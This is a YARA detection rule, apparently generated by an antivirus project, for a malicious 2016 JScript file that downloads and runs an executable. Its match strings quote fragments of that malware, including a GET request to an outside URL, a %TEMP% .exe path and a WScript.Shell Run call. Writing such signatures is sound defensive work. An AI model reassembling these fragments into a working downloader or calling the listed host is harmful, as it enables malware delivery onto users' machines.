rule sig_20160329_0b308afb731d86468fc9b0cba7cf8e13 {
  meta:
    description = "datamaliciousorder - file 20160329_0b308afb731d86468fc9b0cba7cf8e13.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c4ff2ada1234648d964d7c908c9c13e3270b9385b2c690959ea359131a7750f2"

  strings:
    $s1  = "L0[U](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function BM() {return b[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Cj601BLdk.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[cc](El() * 11); if (L0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function A(k0, OI){h = h * 1; return k0 - OI;};" fullword ascii
    $s5  = "var b = function tG() {return WScript[yh](\"WScript.Shell\");}(), lx = 11;" fullword ascii
    $s6  = "function qh(){return \"\" + yX;};" fullword ascii
    $s7  = "function Z(t){b[\"Run\"](t, h, h);};" fullword ascii
    $s8  = "function G() {return ((tf == true) && (tf == P0)) ? 1 : h;};" fullword ascii
    $s9  = "function q(Rw) {var Rd = (1, 2, 3, 4, 5, Rw); return Rd;};" fullword ascii
    $s10 = "var ri = new this[\"Date\"]();" fullword ascii
    $s11 = "function M(){return yh;};" fullword ascii
    $s12 = " while (k){" fullword ascii
    $s13 = "return A(L, P);" fullword ascii
    $s14 = "function G0()" fullword ascii
    $s15 = "function El(){return 22;};" fullword ascii
    $s16 = "var Tb = false;" fullword ascii
    $s17 = "P0 = true; " fullword ascii
    $s18 = "var P0 = false;" fullword ascii
    $s19 = "tf = true; " fullword ascii
    $s20 = "var tf = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}